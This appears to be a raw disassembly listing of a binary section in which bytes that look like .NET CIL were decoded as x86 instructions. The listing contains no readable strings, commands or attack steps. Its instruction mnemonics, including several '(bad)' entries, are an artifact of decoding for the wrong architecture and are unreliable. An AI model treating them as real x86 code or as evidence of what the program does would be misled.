  4030a6:	0a 72 f5             	or     -0xb(%edx),%dh
  4030a9:	03 00                	add    (%eax),%eax
  4030ab:	70 28                	jo     0x4030d5
  4030ad:	1f                   	pop    %ds
  4030ae:	00 00                	add    %al,(%eax)
  4030b0:	0a 2b                	or     (%ebx),%ch
  4030b2:	01 17                	add    %edx,(%edi)
  4030b4:	13 05 11 05 2c 06    	adc    0x62c0511,%eax
  4030ba:	00 17                	add    %dl,(%edi)
  4030bc:	13 06                	adc    (%esi),%eax
  4030be:	de 42 00             	fiadds 0x0(%edx)
  4030c1:	08 6f 85             	or     %ch,-0x7b(%edi)
  4030c4:	00 00                	add    %al,(%eax)
  4030c6:	0a 3a                	or     (%edx),%bh
  4030c8:	6f                   	outsl  %ds:(%esi),(%dx)
  4030c9:	ff                   	(bad)
  4030ca:	ff                   	(bad)
  4030cb:	ff                   	lcall  (bad)
  4030cc:	de 0b                	fimuls (%ebx)
  4030ce:	08 2c 07             	or     %ch,(%edi,%eax,1)
  4030d1:	08 6f 2d             	or     %ch,0x2d(%edi)
  4030d4:	00 00                	add    %al,(%eax)
  4030d6:	0a 00                	or     (%eax),%al
  4030d8:	dc 00                	faddl  (%eax)
  4030da:	de 0b                	fimuls (%ebx)
  4030dc:	07                   	pop    %es
  4030dd:	2c 07                	sub    $0x7,%al
  4030df:	07                   	pop    %es
  4030e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4030e1:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  4030e6:	dc 00                	faddl  (%eax)
  4030e8:	de 0b                	fimuls (%ebx)
  4030ea:	06                   	push   %es
  4030eb:	2c 07                	sub    $0x7,%al
  4030ed:	06                   	push   %es
  4030ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4030ef:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  4030f4:	dc 00                	faddl  (%eax)
  4030f6:	de 05 26 00 00 de    	fiadds 0xde000026
  4030fc:	00 16                	add    %dl,(%esi)
  4030fe:	13 06                	adc    (%esi),%eax
  403100:	2b 00                	sub    (%eax),%eax
  403102:	11 06                	adc    %eax,(%esi)
  403104:	2a 00                	sub    (%eax),%al
  403106:	00 00                	add    %al,(%eax)
  403108:	01 34 00             	add    %esi,(%eax,%eax,1)
  40310b:	00 02                	add    %al,(%edx)
  40310d:	00 1e                	add    %bl,(%esi)
  40310f:	00 98 b6 00 0b 00    	add    %bl,0xb00b6(%eax)
  403115:	00 00                	add    %al,(%eax)
  403117:	00 02                	add    %al,(%edx)
  403119:	00 15 00 af c4 00    	add    %dl,0xc4af00
  40311f:	0b 00                	or     (%eax),%eax
  403121:	00 00                	add    %al,(%eax)
  403123:	00 02                	add    %al,(%edx)
  403125:	00 0d 00 c5 d2 00    	add    %cl,0xd2c500
  40312b:	0b 00                	or     (%eax),%eax
  40312d:	00 00                	add    %al,(%eax)
  40312f:	00 00                	add    %al,(%eax)
  403131:	00 01                	add    %al,(%ecx)
  403133:	00 df                	add    %bl,%bh
  403135:	e0 00                	loopne 0x403137
  403137:	05 0f 00 00 01       	add    $0x100000f,%eax
  40313c:	1b 30                	sbb    (%eax),%esi
  40313e:	02 00                	add    (%eax),%al
  403140:	22 00                	and    (%eax),%al
  403142:	00 00                	add    %al,(%eax)
  403144:	0a 00                	or     (%eax),%al
  403146:	00 11                	add    %dl,(%ecx)
  403148:	00 16                	add    %dl,(%esi)
  40314a:	0a 00                	or     (%eax),%al
  40314c:	28 55 00             	sub    %dl,0x0(%ebp)
  40314f:	00 0a                	add    %cl,(%edx)
  403151:	6f                   	outsl  %ds:(%esi),(%dx)
  403152:	86 00                	xchg   %al,(%eax)
  403154:	00 0a                	add    %cl,(%edx)
  403156:	12 00                	adc    (%eax),%al
  403158:	28 3b                	sub    %bh,(%ebx)
  40315a:	00 00                	add    %al,(%eax)
  40315c:	06                   	push   %es
  40315d:	26 06                	es push %es
  40315f:	0b de                	or     %esi,%ebx
  403161:	06                   	push   %es
  403162:	26 00 06             	add    %al,%es:(%esi)
  403165:	0b de                	or     %esi,%ebx
  403167:	00 07                	add    %al,(%edi)
  403169:	2a 00                	sub    (%eax),%al
  40316b:	00 01                	add    %al,(%ecx)
  40316d:	10 00                	adc    %al,(%eax)
  40316f:	00 00                	add    %al,(%eax)
  403171:	00 03                	add    %al,(%ebx)
  403173:	00 17                	add    %dl,(%edi)
  403175:	1a 00                	sbb    (%eax),%al
  403177:	06                   	push   %es
  403178:	0f 00 00             	sldt   (%eax)
  40317b:	01 1b                	add    %ebx,(%ebx)
  40317d:	30 02                	xor    %al,(%edx)
  40317f:	00 2b                	add    %ch,(%ebx)
  403181:	00 00                	add    %al,(%eax)
  403183:	00 0c 00             	add    %cl,(%eax,%eax,1)
  403186:	00 11                	add    %dl,(%ecx)
  403188:	00 00                	add    %al,(%eax)
  40318a:	72 0b                	jb     0x403197
  40318c:	04 00                	add    $0x0,%al
  40318e:	70 28                	jo     0x4031b8
  403190:	3a 00                	cmp    (%eax),%al
  403192:	00 06                	add    %al,(%esi)
  403194:	0b 12                	or     (%edx),%edx
  403196:	01 28                	add    %ebp,(%eax)
  403198:	87 00                	xchg   %eax,(%eax)
  40319a:	00 0a                	add    %cl,(%edx)
  40319c:	16                   	push   %ss
  40319d:	fe 03                	incb   (%ebx)
  40319f:	0a 06                	or     (%esi),%al
  4031a1:	2c 04                	sub    $0x4,%al
  4031a3:	17                   	pop    %ss
  4031a4:	0c de                	or     $0xde,%al
  4031a6:	0a 16                	or     (%esi),%dl
  4031a8:	0c de                	or     $0xde,%al
  4031aa:	06                   	push   %es
  4031ab:	26 00 16             	add    %dl,%es:(%esi)
  4031ae:	0c de                	or     $0xde,%al
  4031b0:	00 08                	add    %cl,(%eax)
  4031b2:	2a 00                	sub    (%eax),%al
  4031b4:	01 10                	add    %edx,(%eax)
  4031b6:	00 00                	add    %al,(%eax)
  4031b8:	00 00                	add    %al,(%eax)
  4031ba:	01 00                	add    %eax,(%eax)
  4031bc:	22 23                	and    (%ebx),%ah
  4031be:	00 06                	add    %al,(%esi)
  4031c0:	0f 00 00             	sldt   (%eax)
  4031c3:	01 22                	add    %esp,(%edx)
  4031c5:	02 28                	add    (%eax),%ch
  4031c7:	14 00                	adc    $0x0,%al
  4031c9:	00 0a                	add    %cl,(%edx)
  4031cb:	00 2a                	add    %ch,(%edx)
  4031cd:	00 00                	add    %al,(%eax)
  4031cf:	00 1b                	add    %bl,(%ebx)
  4031d1:	30 04 00             	xor    %al,(%eax,%eax,1)
  4031d4:	62 00                	bound  %eax,(%eax)
  4031d6:	00 00                	add    %al,(%eax)
  4031d8:	0d 00 00 11 00       	or     $0x110000,%eax
  4031dd:	00 1b                	add    %bl,(%ebx)
  4031df:	8d 0f                	lea    (%edi),%ecx
  4031e1:	00 00                	add    %al,(%eax)
  4031e3:	01 25 16 28 88 00    	add    %esp,0x882816
  4031e9:	00 0a                	add    %cl,(%edx)
  4031eb:	8c 71 00             	mov    %?,0x0(%ecx)
  4031ee:	00 01                	add    %al,(%ecx)
  4031f0:	a2 25 17 28 89       	mov    %al,0x89281725
  4031f5:	00 00                	add    %al,(%eax)
  4031f7:	0a a2 25 18 28 8a    	or     -0x75d7e7db(%edx),%ah
  4031fd:	00 00                	add    %al,(%eax)
  4031ff:	0a a2 25 19 28 8b    	or     -0x74d7e6db(%edx),%ah
  403205:	00 00                	add    %al,(%eax)
  403207:	0a a2 25 1a 28 77    	or     0x77281a25(%edx),%ah
  40320d:	00 00                	add    %al,(%eax)
  40320f:	0a 28                	or     (%eax),%ch
  403211:	78 00                	js     0x403213
  403213:	00 0a                	add    %cl,(%edx)
  403215:	73 79                	jae    0x403290
  403217:	00 00                	add    %al,(%eax)
  403219:	0a 28                	or     (%eax),%ch
  40321b:	7a 00                	jp     0x40321d
  40321d:	00 0a                	add    %cl,(%edx)
  40321f:	8c 5f 00             	mov    %ds,0x0(%edi)
  403222:	00 01                	add    %al,(%ecx)
  403224:	a2 28 8c 00 00       	mov    %al,0x8c28
  403229:	0a 28                	or     (%eax),%ch
  40322b:	2e 00 00             	add    %al,%cs:(%eax)
  40322e:	06                   	push   %es
  40322f:	0a de                	or     %dh,%bl
  403231:	0a 26                	or     (%esi),%ah
  403233:	00 72 23             	add    %dh,0x23(%edx)
  403236:	04 00                	add    $0x0,%al
  403238:	70 0a                	jo     0x403244
  40323a:	de 00                	fiadds (%eax)
  40323c:	06                   	push   %es
  40323d:	2a 00                	sub    (%eax),%al
  40323f:	00 01                	add    %al,(%ecx)
  403241:	10 00                	adc    %al,(%eax)
  403243:	00 00                	add    %al,(%eax)
  403245:	00 01                	add    %al,(%ecx)
  403247:	00 55 56             	add    %dl,0x56(%ebp)
  40324a:	00 0a                	add    %cl,(%edx)
  40324c:	0f 00 00             	sldt   (%eax)
  40324f:	01 13                	add    %edx,(%ebx)
  403251:	30 03                	xor    %al,(%ebx)
  403253:	00 69 00             	add    %ch,0x0(%ecx)
  403256:	00 00                	add    %al,(%eax)
  403258:	0e                   	push   %cs
  403259:	00 00                	add    %al,(%eax)
  40325b:	11 00                	adc    %eax,(%eax)
  40325d:	73 8d                	jae    0x4031ec
  40325f:	00 00                	add    %al,(%eax)
  403261:	0a 0a                	or     (%edx),%cl
  403263:	28 8e 00 00 0a 02    	sub    %cl,0x20a0000(%esi)
  403269:	6f                   	outsl  %ds:(%esi),(%dx)
  40326a:	18 00                	sbb    %al,(%eax)
  40326c:	00 0a                	add    %cl,(%edx)
  40326e:	0b 06                	or     (%esi),%eax
  403270:	07                   	pop    %es
  403271:	6f                   	outsl  %ds:(%esi),(%dx)
  403272:	8f 00                	pop    (%eax)
  403274:	00 0a                	add    %cl,(%edx)
  403276:	0b 73 90             	or     -0x70(%ebx),%esi
  403279:	00 00                	add    %al,(%eax)
  40327b:	0a 0c 00             	or     (%eax,%eax,1),%cl
  40327e:	07                   	pop    %es
  40327f:	0d 16 13 04 2b       	or     $0x2b041316,%eax
  403284:	1f                   	pop    %ds
  403285:	09 11                	or     %edx,(%ecx)
  403287:	04 91                	add    $0x91,%al
  403289:	13 05 08 12 05 72    	adc    0x72051208,%eax
  40328f:	35 04 00 70 28       	xor    $0x28700004,%eax
  403294:	91                   	xchg   %eax,%ecx
  403295:	00 00                	add    %al,(%eax)
  403297:	0a 6f 92             	or     -0x6e(%edi),%ch
  40329a:	00 00                	add    %al,(%eax)
  40329c:	0a 26                	or     (%esi),%ah
  40329e:	11 04 17             	adc    %eax,(%edi,%edx,1)
  4032a1:	58                   	pop    %eax
  4032a2:	13 04 11             	adc    (%ecx,%edx,1),%eax
  4032a5:	04 09                	add    $0x9,%al
  4032a7:	8e 69 32             	mov    0x32(%ecx),%gs
  4032aa:	da 08                	fimull (%eax)
  4032ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4032ad:	33 00                	xor    (%eax),%eax
  4032af:	00 0a                	add    %cl,(%edx)
  4032b1:	16                   	push   %ss
  4032b2:	1f                   	pop    %ds
  4032b3:	14 6f                	adc    $0x6f,%al
  4032b5:	93                   	xchg   %eax,%ebx
  4032b6:	00 00                	add    %al,(%eax)
  4032b8:	0a 6f 94             	or     -0x6c(%edi),%ch
  4032bb:	00 00                	add    %al,(%eax)
  4032bd:	0a 13                	or     (%ebx),%dl
  4032bf:	06                   	push   %es
  4032c0:	2b 00                	sub    (%eax),%eax
  4032c2:	11 06                	adc    %eax,(%esi)
  4032c4:	2a 00                	sub    (%eax),%al
  4032c6:	00 00                	add    %al,(%eax)
  4032c8:	13 30                	adc    (%eax),%esi
  4032ca:	06                   	push   %es
  4032cb:	00 c4                	add    %al,%ah
  4032cd:	01 00                	add    %eax,(%eax)
  4032cf:	00 0f                	add    %cl,(%edi)
  4032d1:	00 00                	add    %al,(%eax)
  4032d3:	11 00                	adc    %eax,(%eax)
  4032d5:	73 4d                	jae    0x403324
  4032d7:	00 00                	add    %al,(%eax)
  4032d9:	0a 0a                	or     (%edx),%cl
  4032db:	06                   	push   %es
  4032dc:	72 7b                	jb     0x403359
  4032de:	01 00                	add    %eax,(%eax)
  4032e0:	70 6f                	jo     0x403351
  4032e2:	4e                   	dec    %esi
  4032e3:	00 00                	add    %al,(%eax)
  4032e5:	0a 72 3b             	or     0x3b(%edx),%dh
  4032e8:	04 00                	add    $0x0,%al
  4032ea:	70 6f                	jo     0x40335b
  4032ec:	4f                   	dec    %edi
  4032ed:	00 00                	add    %al,(%eax)
  4032ef:	0a 00                	or     (%eax),%al
  4032f1:	06                   	push   %es
  4032f2:	72 51                	jb     0x403345
  4032f4:	04 00                	add    $0x0,%al
  4032f6:	70 6f                	jo     0x403367
  4032f8:	4e                   	dec    %esi
  4032f9:	00 00                	add    %al,(%eax)
  4032fb:	0a 7e 10             	or     0x10(%esi),%bh
  4032fe:	00 00                	add    %al,(%eax)
  403300:	04 6f                	add    $0x6f,%al
  403302:	4f                   	dec    %edi
  403303:	00 00                	add    %al,(%eax)
  403305:	0a 00                	or     (%eax),%al
  403307:	06                   	push   %es
  403308:	72 5b                	jb     0x403365
  40330a:	04 00                	add    $0x0,%al
  40330c:	70 6f                	jo     0x40337d
  40330e:	4e                   	dec    %esi
  40330f:	00 00                	add    %al,(%eax)
  403311:	0a 28                	or     (%eax),%ch
  403313:	89 00                	mov    %eax,(%eax)
  403315:	00 0a                	add    %cl,(%edx)
  403317:	6f                   	outsl  %ds:(%esi),(%dx)
  403318:	33 00                	xor    (%eax),%eax
  40331a:	00 0a                	add    %cl,(%edx)
  40331c:	6f                   	outsl  %ds:(%esi),(%dx)
  40331d:	4f                   	dec    %edi
  40331e:	00 00                	add    %al,(%eax)
  403320:	0a 00                	or     (%eax),%al
  403322:	06                   	push   %es
  403323:	72 65                	jb     0x40338a
  403325:	04 00                	add    $0x0,%al
  403327:	70 6f                	jo     0x403398
  403329:	4e                   	dec    %esi
  40332a:	00 00                	add    %al,(%eax)
  40332c:	0a 73 7b             	or     0x7b(%ebx),%dh
  40332f:	00 00                	add    %al,(%eax)
  403331:	0a 28                	or     (%eax),%ch
  403333:	7c 00                	jl     0x403335
  403335:	00 0a                	add    %cl,(%edx)
  403337:	6f                   	outsl  %ds:(%esi),(%dx)
  403338:	33 00                	xor    (%eax),%eax
  40333a:	00 0a                	add    %cl,(%edx)
  40333c:	72 6b                	jb     0x4033a9
  40333e:	04 00                	add    $0x0,%al
  403340:	70 14                	jo     0x403356
  403342:	6f                   	outsl  %ds:(%esi),(%dx)
  403343:	95                   	xchg   %eax,%ebp
  403344:	00 00                	add    %al,(%eax)
  403346:	0a 72 7f             	or     0x7f(%edx),%dh
  403349:	04 00                	add    $0x0,%al
  40334b:	70 28                	jo     0x403375
  40334d:	96                   	xchg   %eax,%esi
  40334e:	00 00                	add    %al,(%eax)
  403350:	0a 0b                	or     (%ebx),%cl
  403352:	12 01                	adc    (%ecx),%al
  403354:	28 97 00 00 0a 72    	sub    %dl,0x720a0000(%edi)
  40335a:	83 04 00 70          	addl   $0x70,(%eax,%eax,1)
  40335e:	72 8d                	jb     0x4032ed
  403360:	04 00                	add    $0x0,%al
  403362:	70 6f                	jo     0x4033d3
  403364:	95                   	xchg   %eax,%ebp
  403365:	00 00                	add    %al,(%eax)
  403367:	0a 72 99             	or     -0x67(%edx),%dh
  40336a:	04 00                	add    $0x0,%al
  40336c:	70 72                	jo     0x4033e0
  40336e:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40336f:	04 00                	add    $0x0,%al
  403371:	70 6f                	jo     0x4033e2
  403373:	95                   	xchg   %eax,%ebp
  403374:	00 00                	add    %al,(%eax)
  403376:	0a 28                	or     (%eax),%ch
  403378:	40                   	inc    %eax
  403379:	00 00                	add    %al,(%eax)
  40337b:	0a 6f 4f             	or     0x4f(%edi),%ch
  40337e:	00 00                	add    %al,(%eax)
  403380:	0a 00                	or     (%eax),%al
  403382:	06                   	push   %es
  403383:	72 b1                	jb     0x403336
  403385:	04 00                	add    $0x0,%al
  403387:	70 6f                	jo     0x4033f8
  403389:	4e                   	dec    %esi
  40338a:	00 00                	add    %al,(%eax)
  40338c:	0a 28                	or     (%eax),%ch
  40338e:	98                   	cwtl
  40338f:	00 00                	add    %al,(%eax)
  403391:	0a 6f 4f             	or     0x4f(%edi),%ch
  403394:	00 00                	add    %al,(%eax)
  403396:	0a 00                	or     (%eax),%al
  403398:	06                   	push   %es
  403399:	72 bb                	jb     0x403356
  40339b:	04 00                	add    $0x0,%al
  40339d:	70 6f                	jo     0x40340e
  40339f:	4e                   	dec    %esi
  4033a0:	00 00                	add    %al,(%eax)
  4033a2:	0a 7e 03             	or     0x3(%esi),%bh
  4033a5:	00 00                	add    %al,(%eax)
  4033a7:	04 6f                	add    $0x6f,%al
  4033a9:	4f                   	dec    %edi
  4033aa:	00 00                	add    %al,(%eax)
  4033ac:	0a 00                	or     (%eax),%al
  4033ae:	06                   	push   %es
  4033af:	72 cb                	jb     0x40337c
  4033b1:	04 00                	add    $0x0,%al
  4033b3:	70 6f                	jo     0x403424
  4033b5:	4e                   	dec    %esi
  4033b6:	00 00                	add    %al,(%eax)
  4033b8:	0a 28                	or     (%eax),%ch
  4033ba:	30 00                	xor    %al,(%eax)
  4033bc:	00 06                	add    %al,(%esi)
  4033be:	0b 12                	or     (%edx),%edx
  4033c0:	01 28                	add    %ebp,(%eax)
  4033c2:	97                   	xchg   %eax,%edi
  4033c3:	00 00                	add    %al,(%eax)
  4033c5:	0a 6f 7d             	or     0x7d(%edi),%ch
  4033c8:	00 00                	add    %al,(%eax)
  4033ca:	0a 72 d7             	or     -0x29(%edx),%dh
  4033cd:	04 00                	add    $0x0,%al
  4033cf:	70 72                	jo     0x403443
  4033d1:	cb                   	lret
  4033d2:	04 00                	add    $0x0,%al
  4033d4:	70 6f                	jo     0x403445
  4033d6:	95                   	xchg   %eax,%ebp
  4033d7:	00 00                	add    %al,(%eax)
  4033d9:	0a 72 3f             	or     0x3f(%edx),%dh
  4033dc:	00 00                	add    %al,(%eax)
  4033de:	70 72                	jo     0x403452
  4033e0:	5b                   	pop    %ebx
  4033e1:	04 00                	add    $0x0,%al
  4033e3:	70 6f                	jo     0x403454
  4033e5:	95                   	xchg   %eax,%ebp
  4033e6:	00 00                	add    %al,(%eax)
  4033e8:	0a 6f 4f             	or     0x4f(%edi),%ch
  4033eb:	00 00                	add    %al,(%eax)
  4033ed:	0a 00                	or     (%eax),%al
  4033ef:	06                   	push   %es
  4033f0:	72 e1                	jb     0x4033d3
  4033f2:	04 00                	add    $0x0,%al
  4033f4:	70 6f                	jo     0x403465
  4033f6:	4e                   	dec    %esi
  4033f7:	00 00                	add    %al,(%eax)
  4033f9:	0a 28                	or     (%eax),%ch
  4033fb:	35 00 00 06 6f       	xor    $0x6f060000,%eax
  403400:	4f                   	dec    %edi
  403401:	00 00                	add    %al,(%eax)
  403403:	0a 00                	or     (%eax),%al
  403405:	06                   	push   %es
  403406:	72 f9                	jb     0x403401
  403408:	04 00                	add    $0x0,%al
  40340a:	70 6f                	jo     0x40347b
  40340c:	4e                   	dec    %esi
  40340d:	00 00                	add    %al,(%eax)
  40340f:	0a 7e 0e             	or     0xe(%esi),%bh
  403412:	00 00                	add    %al,(%eax)
  403414:	04 6f                	add    $0x6f,%al
  403416:	4f                   	dec    %edi
  403417:	00 00                	add    %al,(%eax)
  403419:	0a 00                	or     (%eax),%al
  40341b:	06                   	push   %es
  40341c:	72 0b                	jb     0x403429
  40341e:	05 00 70 6f 4e       	add    $0x4e6f7000,%eax
  403423:	00 00                	add    %al,(%eax)
  403425:	0a 28                	or     (%eax),%ch
  403427:	32 00                	xor    (%eax),%al
  403429:	00 06                	add    %al,(%esi)
  40342b:	6f                   	outsl  %ds:(%esi),(%dx)
  40342c:	4f                   	dec    %edi
  40342d:	00 00                	add    %al,(%eax)
  40342f:	0a 00                	or     (%eax),%al
  403431:	06                   	push   %es
  403432:	72 1f                	jb     0x403453
  403434:	05 00 70 6f 4e       	add    $0x4e6f7000,%eax
  403439:	00 00                	add    %al,(%eax)
  40343b:	0a 28                	or     (%eax),%ch
  40343d:	98                   	cwtl
  40343e:	00 00                	add    %al,(%eax)
  403440:	0a 73 54             	or     0x54(%ebx),%dh
  403443:	00 00                	add    %al,(%eax)
  403445:	0a 28                	or     (%eax),%ch
  403447:	99                   	cltd
  403448:	00 00                	add    %al,(%eax)
  40344a:	0a 0c 12             	or     (%edx,%edx,1),%cl
  40344d:	02 28                	add    (%eax),%ch
  40344f:	9a 00 00 0a 0c 12 02 	lcall  $0x212,$0xc0a0000
  403456:	28 9b 00 00 0a 6f    	sub    %bl,0x6f0a0000(%ebx)
  40345c:	4f                   	dec    %edi
  40345d:	00 00                	add    %al,(%eax)
  40345f:	0a 00                	or     (%eax),%al
  403461:	06                   	push   %es
  403462:	72 33                	jb     0x403497
  403464:	05 00 70 6f 4e       	add    $0x4e6f7000,%eax
  403469:	00 00                	add    %al,(%eax)
  40346b:	0a 72 e5             	or     -0x1b(%edx),%dh
  40346e:	00 00                	add    %al,(%eax)
  403470:	70 6f                	jo     0x4034e1
  403472:	4f                   	dec    %edi
  403473:	00 00                	add    %al,(%eax)
  403475:	0a 00                	or     (%eax),%al
  403477:	06                   	push   %es
  403478:	72 3d                	jb     0x4034b7
  40347a:	05 00 70 6f 4e       	add    $0x4e6f7000,%eax
  40347f:	00 00                	add    %al,(%eax)
  403481:	0a 7e 12             	or     0x12(%esi),%bh
  403484:	00 00                	add    %al,(%eax)
  403486:	04 6f                	add    $0x6f,%al
  403488:	4f                   	dec    %edi
  403489:	00 00                	add    %al,(%eax)
  40348b:	0a 00                	or     (%eax),%al
  40348d:	06                   	push   %es
  40348e:	6f                   	outsl  %ds:(%esi),(%dx)
  40348f:	50                   	push   %eax
  403490:	00 00                	add    %al,(%eax)
  403492:	0a 0d 2b 00 09 2a    	or     0x2a09002b,%cl
  403498:	13 30                	adc    (%eax),%esi
  40349a:	02 00                	add    (%eax),%al
  40349c:	1a 00                	sbb    (%eax),%al
  40349e:	00 00                	add    %al,(%eax)
  4034a0:	02 00                	add    (%eax),%al
  4034a2:	00 11                	add    %dl,(%ecx)
  4034a4:	00 28                	add    %ch,(%eax)
  4034a6:	9c                   	pushf
  4034a7:	00 00                	add    %al,(%eax)
  4034a9:	0a 73 9d             	or     -0x63(%ebx),%dh
  4034ac:	00 00                	add    %al,(%eax)
  4034ae:	0a 20                	or     (%eax),%ah
  4034b0:	20 02                	and    %al,(%edx)
  4034b2:	00 00                	add    %al,(%eax)
  4034b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4034b5:	9e                   	sahf
  4034b6:	00 00                	add    %al,(%eax)
  4034b8:	0a 0a                	or     (%edx),%cl
  4034ba:	2b 00                	sub    (%eax),%eax
  4034bc:	06                   	push   %es
  4034bd:	2a 00                	sub    (%eax),%al
  4034bf:	00 1b                	add    %bl,(%ebx)
  4034c1:	30 02                	xor    %al,(%edx)
  4034c3:	00 51 00             	add    %dl,0x0(%ecx)
  4034c6:	00 00                	add    %al,(%eax)
  4034c8:	02 00                	add    (%eax),%al
  4034ca:	00 11                	add    %dl,(%ecx)
  4034cc:	00 00                	add    %al,(%eax)
  4034ce:	7e 0f                	jle    0x4034df
  4034d0:	00 00                	add    %al,(%eax)
  4034d2:	04 28                	add    $0x28,%al
  4034d4:	13 00                	adc    (%eax),%eax
  4034d6:	00 0a                	add    %cl,(%edx)
  4034d8:	2c 07                	sub    $0x7,%al
  4034da:	28 30                	sub    %dh,(%eax)
  4034dc:	00 00                	add    %al,(%eax)
  4034de:	06                   	push   %es
  4034df:	2b 01                	sub    (%ecx),%eax
  4034e1:	16                   	push   %ss
  4034e2:	0a 06                	or     (%esi),%al
  4034e4:	2c 06                	sub    $0x6,%al
  4034e6:	28 40 00             	sub    %al,0x0(%eax)
  4034e9:	00 06                	add    %al,(%esi)
  4034eb:	00 28                	add    %ch,(%eax)
  4034ed:	37                   	aaa
  4034ee:	00 00                	add    %al,(%eax)
  4034f0:	06                   	push   %es
  4034f1:	00 28                	add    %ch,(%eax)
  4034f3:	08 00                	or     %al,(%eax)
  4034f5:	00 06                	add    %al,(%esi)
  4034f7:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  4034fc:	06                   	push   %es
  4034fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4034fe:	9f                   	lahf
  4034ff:	00 00                	add    %al,(%eax)
  403501:	0a 00                	or     (%eax),%al
  403503:	28 06                	sub    %al,(%esi)
  403505:	00 00                	add    %al,(%eax)
  403507:	06                   	push   %es
  403508:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  40350d:	06                   	push   %es
  40350e:	28 a0 00 00 0a 00    	sub    %ah,0xa0000(%eax)
  403514:	00 de                	add    %bl,%dh
  403516:	05 26 00 00 de       	add    $0xde000026,%eax
  40351b:	00 2a                	add    %ch,(%edx)
  40351d:	00 00                	add    %al,(%eax)
  40351f:	00 01                	add    %al,(%ecx)
  403521:	10 00                	adc    %al,(%eax)
  403523:	00 00                	add    %al,(%eax)
  403525:	00 01                	add    %al,(%ecx)
  403527:	00 4a 4b             	add    %cl,0x4b(%edx)
  40352a:	00 05 0f 00 00 01    	add    %al,0x100000f
  403530:	1b 30                	sbb    (%eax),%esi
  403532:	03 00                	add    (%eax),%eax
  403534:	b1 00                	mov    $0x0,%cl
  403536:	00 00                	add    %al,(%eax)
  403538:	10 00                	adc    %al,(%eax)
  40353a:	00 11                	add    %dl,(%ecx)
  40353c:	00 00                	add    %al,(%eax)
  40353e:	72 49                	jb     0x403589
  403540:	05 00 70 28 8a       	add    $0x8a287000,%eax
  403545:	00 00                	add    %al,(%eax)
  403547:	0a 72 4f             	or     0x4f(%edx),%dh
  40354a:	05 00 70 28 40       	add    $0x40287000,%eax
  40354f:	00 00                	add    %al,(%eax)
  403551:	0a 72 7b             	or     0x7b(%edx),%dh
  403554:	05 00 70 73 a1       	add    $0xa1737000,%eax
  403559:	00 00                	add    %al,(%eax)
  40355b:	0a 0a                	or     (%edx),%cl
  40355d:	00 73 a2             	add    %dh,-0x5e(%ebx)
  403560:	00 00                	add    %al,(%eax)
  403562:	0a 0b                	or     (%ebx),%cl
  403564:	00 06                	add    %al,(%esi)
  403566:	6f                   	outsl  %ds:(%esi),(%dx)
  403567:	80 00 00             	addb   $0x0,(%eax)
  40356a:	0a 6f 81             	or     -0x7f(%edi),%ch
  40356d:	00 00                	add    %al,(%eax)
  40356f:	0a 0c 2b             	or     (%ebx,%ebp,1),%cl
  403572:	20 08                	and    %cl,(%eax)
  403574:	6f                   	outsl  %ds:(%esi),(%dx)
  403575:	82 00 00             	addb   $0x0,(%eax)
  403578:	0a 0d 00 07 09 72    	or     0x72090700,%cl
  40357e:	b9 05 00 70 6f       	mov    $0x6f700005,%ecx
  403583:	83 00 00             	addl   $0x0,(%eax)
  403586:	0a 6f 33             	or     0x33(%edi),%ch
  403589:	00 00                	add    %al,(%eax)
  40358b:	0a 6f a3             	or     -0x5d(%edi),%ch
  40358e:	00 00                	add    %al,(%eax)
  403590:	0a 00                	or     (%eax),%al
  403592:	00 08                	add    %cl,(%eax)
  403594:	6f                   	outsl  %ds:(%esi),(%dx)
  403595:	85 00                	test   %eax,(%eax)
  403597:	00 0a                	add    %cl,(%edx)
  403599:	2d d8 de 0b 08       	sub    $0x80bded8,%eax
  40359e:	2c 07                	sub    $0x7,%al
  4035a0:	08 6f 2d             	or     %ch,0x2d(%edi)
  4035a3:	00 00                	add    %al,(%eax)
  4035a5:	0a 00                	or     (%eax),%al
  4035a7:	dc 07                	faddl  (%edi)
  4035a9:	6f                   	outsl  %ds:(%esi),(%dx)
  4035aa:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4035ab:	00 00                	add    %al,(%eax)
  4035ad:	0a 16                	or     (%esi),%dl
  4035af:	fe 01                	incb   (%ecx)
  4035b1:	13 04 11             	adc    (%ecx,%edx,1),%eax
  4035b4:	04 2c                	add    $0x2c,%al
  4035b6:	09 72 d1             	or     %esi,-0x2f(%edx)
  4035b9:	05 00 70 13 05       	add    $0x5137000,%eax
  4035be:	de 2a                	fisubrs (%edx)
  4035c0:	72 d9                	jb     0x40359b
  4035c2:	05 00 70 07 6f       	add    $0x6f077000,%eax
  4035c7:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4035c8:	00 00                	add    %al,(%eax)
  4035ca:	0a 28                	or     (%eax),%ch
  4035cc:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4035cd:	00 00                	add    %al,(%eax)
  4035cf:	0a 13                	or     (%ebx),%dl
  4035d1:	05 de 16 06 2c       	add    $0x2c0616de,%eax
  4035d6:	07                   	pop    %es
  4035d7:	06                   	push   %es
  4035d8:	6f                   	outsl  %ds:(%esi),(%dx)
  4035d9:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  4035de:	dc 26                	fsubl  (%esi)
  4035e0:	00 72 d1             	add    %dh,-0x2f(%edx)
  4035e3:	05 00 70 13 05       	add    $0x5137000,%eax
  4035e8:	de 00                	fiadds (%eax)
  4035ea:	11 05 2a 00 00 00    	adc    %eax,0x2a
  4035f0:	01 28                	add    %ebp,(%eax)
  4035f2:	00 00                	add    %al,(%eax)
  4035f4:	02 00                	add    (%eax),%al
  4035f6:	35 00 2c 61 00       	xor    $0x612c00,%eax
  4035fb:	0b 00                	or     (%eax),%eax
  4035fd:	00 00                	add    %al,(%eax)
  4035ff:	00 02                	add    %al,(%edx)
  403601:	00 21                	add    %ah,(%ecx)
  403603:	00 77 98             	add    %dh,-0x68(%edi)
  403606:	00 0b                	add    %cl,(%ebx)
  403608:	00 00                	add    %al,(%eax)
  40360a:	00 00                	add    %al,(%eax)
  40360c:	00 00                	add    %al,(%eax)
  40360e:	01 00                	add    %eax,(%eax)
